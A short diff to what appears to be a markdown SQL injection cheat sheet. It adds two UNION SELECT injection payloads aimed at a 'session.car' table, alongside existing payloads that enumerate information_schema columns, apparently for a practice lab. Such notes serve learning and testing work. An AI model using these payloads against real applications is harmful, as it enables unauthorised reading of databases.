@@ -483,6 +483,13 @@ UNION SELECT table_schema,table_name,column_name from information_schema.columns
 ```
 UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
 ```
+```
+'{option:Audi} 'UNION SELECT TYPE,2,cost,color,year from session.car #'
+```
+```
+'Audi ' UNION SELECT carid,2,type,name,year from session.car #'
+```
+
 
 
 
